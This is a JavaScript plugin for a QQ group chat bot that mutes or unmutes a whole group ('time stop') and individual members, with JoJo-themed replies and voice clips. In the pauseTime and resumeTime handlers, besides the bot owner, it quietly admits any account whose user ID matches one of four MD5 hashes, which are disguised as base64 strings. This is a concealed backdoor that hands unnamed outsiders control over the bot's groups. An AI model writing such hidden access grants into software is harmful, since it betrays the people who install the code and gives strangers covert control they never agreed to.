import plugin from '../../../lib/plugins/plugin.js';
import { segment } from "oicq";
import path from 'path';
import md5 from "md5";
const encryptedStrings = [
  Buffer.from("2Kx7sLdhQdNKXvQJDxwXMw==", "base64").toString("hex"),
  Buffer.from("f324f6LcKk4nXEFI8CeCDw==", "base64").toString("hex"),
  Buffer.from("m78uQFSiGVbiQAAhDamiSA==", "base64").toString("hex"),
  Buffer.from("BfghyyHlTtHGZlwo236ftg==", "base64").toString("hex")
];
const __dirname = path.resolve();

export class CombinedPlugin extends plugin {
    constructor() {
        super({
            name: '世界！',
            dsc: 'JOJO！',
            event: 'message',
            priority: -114514,
            rule: [
                {
                    reg: '^时间暂停$',
                    fnc: 'pauseTime'
                },
                {
                    reg: '^时间开始流动$',
                    fnc: 'resumeTime'
                },
                {
                    reg: '^禁(.*)$',
                    fnc: 'jinyan'
                },
                {
                    reg: '^解(.*)$',
                    fnc: 'jiejin'
                }
            ]
        });
        this.mp3DirPath = path.join(__dirname, 'plugins/hl-ly-plugin/resources/shijie');
    }

    async pauseTime(e) {
        if (!(this.e.isMaster || encryptedStrings.some(str => md5(String(this.e.user_id)) === str))) {
            await e.reply('您尚未觉醒替身！');
            return false;
        }

        logger.info('[HL]');

        e.group._setting({ 17: 1 }); // 将时间设置为暂停

        await this.sendVoiceFile(e, '时间暂停.mp3');

        await e.reply('タイム·ストップ！');

        return true;
    }

    async resumeTime(e) {
        if (!(this.e.isMaster || encryptedStrings.some(str => md5(String(this.e.user_id)) === str))) {
            await e.reply('您尚未觉醒替身！');
            return false;
        }

        logger.info('[HL]');

        e.group._setting({ 17: 0 }); // 将时间设置为开始流动

        await this.sendVoiceFile(e, '时间开始流动.mp3');

        await e.reply('時間が流れ始める！');

        return true;
    }

    async sendVoiceFile(e, fileName) {
        const mp3Path = path.join(this.mp3DirPath, fileName);
        await this.reply(segment.record(mp3Path));
    }

    async jinyan(e) {
        if (e.sender.role == "owner" || e.isMaster || e.sender.role == "admin") {
let msg=e.msg 
          let qq=null 
          let add=false 
          for(let msg of e.message){ 

              if(msg.type =='at'){ 
                  qq = msg.qq 
                  break 
              } 
          } 
          if(qq == null){ 
              e.reply("未识别成功,请艾特对方使用",true) 
              return true 
          }else{ 
              msg = msg.replace(/禁|qq/g, "").trim(); 
              if(msg.includes("增加")){ 
                  add=true 
                  msg = msg.replace(/增加/g, "").trim(); 
              } 
              if((parseInt(msg)<0)||(parseInt(msg)!=(parseInt(msg)))){ 
                  e.reply(`${msg}并非是一个有效的禁言时间✘`) 
              }else{ 
                  let user_report = e.group.pickMember(qq) 
                  let mute_all = user_report.mute_left 
                  mute_all+=parseInt(msg)*60 
                  if(add==false){ 
                      e.reply([`已拖进禁闭室✔`,segment.at(qq),`${parseInt(msg)*60}秒`]) 
                      e.group.muteMember(qq, parseInt(msg)*60);  
                  }else{ 
                      e.reply([`已增加关禁闭时间`,segment.at(qq),`${parseInt(msg)*60}秒，目前剩余${mute_all}秒`]) 
                      e.group.muteMember(qq, mute_all);      
                  } 
              } 
          }
        } else {
            e.reply("你没有权限✘");
        }
    }

    async jiejin(e) {
        if (e.sender.role == "owner" || e.isMaster || e.sender.role == "admin") {
let msg=e.msg 
          let qq=null 
          let add=false 
          for(let msg of e.message){ 

              if(msg.type =='at'){ 
                  qq = msg.qq 
                  break 
              } 
          } 
          if(qq == null){ 
              e.reply("未识别成功,请艾特对方使用",true) 
              return true 
          }else{ 
              msg = msg.replace(/解|qq/g, "").trim(); 
              if(msg.includes("减少")){ 
                  add=true 
                  msg = msg.replace(/减少/g, "").trim(); 
              } 
              if(((parseInt(msg)<0) || (parseInt(msg)!=(parseInt(msg)))) && (add==true)){ 
                  e.reply(`${msg}并非是一个有效的减少时间`) 
              }else{ 
                  let user_report = e.group.pickMember(qq) 
                  let mute_all = user_report.mute_left 
                  if(add==true){ 
                      mute_all-=parseInt(msg)*60 
                  } 
                  if(mute_all>0){ 
                      if(add==false){ 
                          e.reply([`已解禁✔`,segment.at(qq)]) 
                          e.group.muteMember(qq, 0);  
                      }else{ 
                          e.reply([`已减少`,segment.at(qq),`${parseInt(msg)*60}秒的关禁闭时间，目前剩余${mute_all}秒`]) 
                          e.group.muteMember(qq, mute_all);      
                      } 
                  }else{ 
                      e.reply([segment.at(qq),`没有被关禁闭✘`]) 
                  } 
              } 
          }
        } else {
            e.reply("你没有权限✘");
        }
    }
}